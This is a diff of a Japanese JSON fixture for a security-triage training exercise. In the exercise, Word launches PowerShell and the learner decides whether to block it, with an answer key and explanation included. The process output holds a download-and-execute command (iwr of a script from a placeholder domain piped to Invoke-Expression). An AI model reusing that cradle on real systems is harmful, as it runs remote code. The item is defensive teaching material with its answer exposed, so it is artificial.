@@ -1,28 +1,58 @@
 {
-  "schema_version": 1,
+  "schema_version": 2,
   "id": "PROC-WIN-OFFICE-DOWNLOAD",
   "category": "process",
   "platform": "windows",
-  "level": "beginner_external",
-  "ground_truth": "block",
   "title": "Officeからの外部取得コマンド",
   "request": "稼働中のプロセスを継続させますか。 ALLOW / BLOCKで判断してください。",
-  "initial_information": {
-    "Process": "powershell.exe",
-    "PID": 4200,
-    "User": "ASTER\\mori",
-    "採取時点": "2026-08-18 09:10 / 起動済み"
+  "required_evidence": [
+    "pe",
+    "domain_rep",
+    "disclosure"
+  ],
+  "ground_truth": "block",
+  "explanation": "Wordが起動したPowerShellに外部取得・実行の引数があり、取得先ドメインも既知の配布先として検出されているため停止します。PowerShellの存在そのものを根拠にはしません。",
+  "initial": {
+    "information": [
+      {
+        "id": "Process",
+        "label": "Process",
+        "value": "powershell.exe",
+        "data_type": "text"
+      },
+      {
+        "id": "PID",
+        "label": "PID",
+        "value": 4200,
+        "data_type": "pid"
+      },
+      {
+        "id": "User",
+        "label": "User",
+        "value": "ASTER\\mori",
+        "data_type": "username"
+      },
+      {
+        "id": "採取時点",
+        "label": "採取時点",
+        "value": "2026-08-18 09:10 / 起動済み",
+        "data_type": "text"
+      }
+    ],
+    "terms": [
+      "extension",
+      "executable",
+      "process",
+      "pid",
+      "powershell",
+      "user"
+    ]
   },
-  "initial_information_types": {
-    "PID": "pid",
-    "User": "username"
-  },
-  "tools": [
+  "resources": [
     {
       "id": "pe",
       "name": "Process Explorer",
       "description": "実行パス・コマンドライン・親プロセス・ロード済みDLLを確認します。",
-      "output": "Parent: WINWORD.EXE (3010)\nPID: 4200\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommand line: powershell.exe -NoProfile -Command \"$response = iwr https://office-assets.example/a.ps1; Invoke-Expression -Command $response.Content\"\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
       "accepted_information_types": [
         "pid"
       ],
@@ -37,41 +67,90 @@
       "environments": [
         "windows"
       ],
-      "output_information": [
-        {
-          "id": "image",
-          "label": "実体ファイル",
-          "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          "data_type": "file"
-        },
-        {
-          "id": "domain",
-          "label": "コマンド内URLのホスト",
-          "value": "office-assets.example",
-          "data_type": "domain"
-        }
+      "kind": "tools",
+      "result": {
+        "content": "Parent: WINWORD.EXE (3010)\nPID: 4200\nImage: {{fact:image}}\nCommand line: powershell.exe -NoProfile -Command \"$response = iwr https://{{fact:domain}}/a.ps1; Invoke-Expression -Command $response.Content\"\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
+        "information": [
+          {
+            "id": "image",
+            "label": "実体ファイル",
+            "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "data_type": "file"
+          },
+          {
+            "id": "domain",
+            "label": "コマンド内URLのホスト",
+            "value": "office-assets.example",
+            "data_type": "domain"
+          }
+        ],
+        "terms": [
+          "extension",
+          "executable",
+          "pid",
+          "powershell",
+          "user",
+          "parent",
+          "command",
+          "dll",
+          "path",
+          "script",
+          "url",
+          "host",
+          "image_process",
+          "training_placeholder",
+          "iwr_curl",
+          "http",
+          "url_path"
+        ]
+      },
+      "terms": [
+        "process",
+        "pid",
+        "parent",
+        "command",
+        "dll",
+        "tool_pe"
       ]
-    }
-  ],
-  "references": [
+    },
     {
       "id": "disclosure",
       "name": "外部照会方針",
-      "content": {
-        "照会対象": "機密指定のないドメイン・IPと公開配布ファイルのSHA-256は、承認された外部サービスへ照会可。",
-        "ファイル本体": "社外秘ファイルは送信不可。公開配布物は送信可。",
-        "URL": "トークン・ユーザーID・内部ホスト・機密パスを含む完全URLは送信不可。",
-        "メール・PCAP": "本文、添付、認証情報を含むため本教材の案件では外部送信不可。",
-        "今回の資料区分": "照会対象に機密指定はありません。ファイル本体とURL全体の扱いは上記に従います。"
-      }
-    }
-  ],
-  "external_references": [
+      "kind": "references",
+      "result": {
+        "content": {
+          "照会対象": "機密指定のないドメイン・IPと公開配布ファイルのSHA-256は、承認された外部サービスへ照会可。",
+          "ファイル本体": "社外秘ファイルは送信不可。公開配布物は送信可。",
+          "URL": "トークン・ユーザーID・内部ホスト・機密パスを含む完全URLは送信不可。",
+          "メール・PCAP": "本文、添付、認証情報を含むため本教材の案件では外部送信不可。",
+          "今回の資料区分": "照会対象に機密指定はありません。ファイル本体とURL全体の扱いは上記に従います。"
+        },
+        "terms": [
+          "user",
+          "path",
+          "url",
+          "host",
+          "url_path",
+          "file",
+          "hash",
+          "sha256",
+          "confidential",
+          "token",
+          "attachment",
+          "authentication",
+          "pcap",
+          "indicator",
+          "email"
+        ]
+      },
+      "terms": [
+        "policy"
+      ]
+    },
     {
       "id": "domain_rep",
       "name": "ドメインの評判",
       "description": "外部サービスへ対象を送信し、保存済みの照会結果を表示します。",
-      "output": "Domain: office-assets.example\n2026-08-18: malware-distribution 11/14 feeds",
       "accepted_information_types": [
         "domain"
       ],
@@ -82,407 +161,36 @@
         }
       ],
       "input_hint": "ドメイン",
-      "submission_type": "domain",
-      "submission_value": "office-assets.example",
-      "confidentiality_warning": "ドメイン名のみを送信します。URLのパス・クエリは送りません。",
       "correct_usage": true,
-      "reason": "外部照会方針でこの照会対象の送信が許可されています。"
-    }
-  ],
-  "required_evidence": [
-    "pe",
-    "domain_rep",
-    "disclosure"
-  ],
-  "glossary": [
-    {
-      "term_id": "extension",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "executable",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "process",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "pe",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "pid",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "pe",
-          "section": "overview"
-        },
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "powershell",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "user",
-      "occurrences": [
-        {
-          "source_id": "initial_information",
-          "section": "initial"
-        },
-        {
-          "source_id": "pe",
-          "section": "result"
-        },
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "parent",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "overview"
-        },
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "command",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "overview"
-        },
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "dll",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "overview"
-        },
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "tool_pe",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "path",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "result"
-        },
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "script",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "url",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "result"
-        },
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        },
-        {
-          "source_id": "domain_rep",
-          "section": "submission"
-        }
-      ]
-    },
-    {
-      "term_id": "host",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "result"
-        },
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        },
-        {
-          "source_id": "domain_rep",
-          "section": "overview"
-        },
-        {
-          "source_id": "domain_rep",
-          "section": "result"
-        },
-        {
-          "source_id": "domain_rep",
-          "section": "submission"
-        }
-      ]
-    },
-    {
-      "term_id": "image_process",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "training_placeholder",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "iwr_curl",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "http",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "url_path",
-      "occurrences": [
-        {
-          "source_id": "pe",
-          "section": "result"
-        },
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        },
-        {
-          "source_id": "domain_rep",
-          "section": "submission"
-        }
-      ]
-    },
-    {
-      "term_id": "policy",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "file",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "hash",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "sha256",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "confidential",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "token",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "attachment",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "authentication",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "pcap",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "indicator",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "email",
-      "occurrences": [
-        {
-          "source_id": "disclosure",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "reputation",
-      "occurrences": [
-        {
-          "source_id": "domain_rep",
-          "section": "overview"
-        }
-      ]
-    },
-    {
-      "term_id": "detection",
-      "occurrences": [
-        {
-          "source_id": "domain_rep",
-          "section": "result"
-        }
-      ]
-    },
-    {
-      "term_id": "malware",
-      "occurrences": [
-        {
-          "source_id": "domain_rep",
-          "section": "result"
-        }
+      "reason": "外部照会方針でこの照会対象の送信が許可されています。",
+      "kind": "external_references",
+      "result": {
+        "content": "Domain: {{input}}\n2026-08-18: malware-distribution 11/14 feeds",
+        "terms": [
+          "host",
+          "detection",
+          "malware"
+        ]
+      },
+      "submission": {
+        "type": "domain",
+        "warning": "ドメイン名のみを送信します。URLのパス・クエリは送りません。",
+        "terms": [
+          "url",
+          "host",
+          "url_path"
+        ]
+      },
+      "terms": [
+        "host",
+        "reputation"
       ]
     }
   ],
-  "explanation": "Wordが起動したPowerShellに外部取得・実行の引数があり、取得先ドメインも既知の配布先として検出されているため停止します。PowerShellの存在そのものを根拠にはしません。",
-  "topic": "親プロセス・コマンドラインとドメインの評判を組み合わせる",
-  "summary": "親プロセス・コマンドラインとドメインの評判を組み合わせる",
   "learning_objectives": [
     "親プロセス・コマンドラインとドメインの評判を組み合わせる"
   ],
-  "decision_context": "running_process",
-  "scenario_type": "standard",
   "sources": [
     "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer"
-  ],
-  "fixture_note": "登場する組織名、ドメイン、IPアドレス、パッケージ名、ハッシュ値、記録は架空のものです。IPアドレスには文書用アドレスを使い、外部評判の照会も実際には行っていません。時刻は2026-08-18を基準とし、必要な項目だけを抜粋しています。実行可能なペイロードは配布していません。各問題は独立した端末・案件の状態を表すスナップショットです。PIDや時刻の再利用は問題間の関連を意味しません。Z付きの時刻を除き、時刻はすべて日本標準時（JST）です。"
+  ]
 }
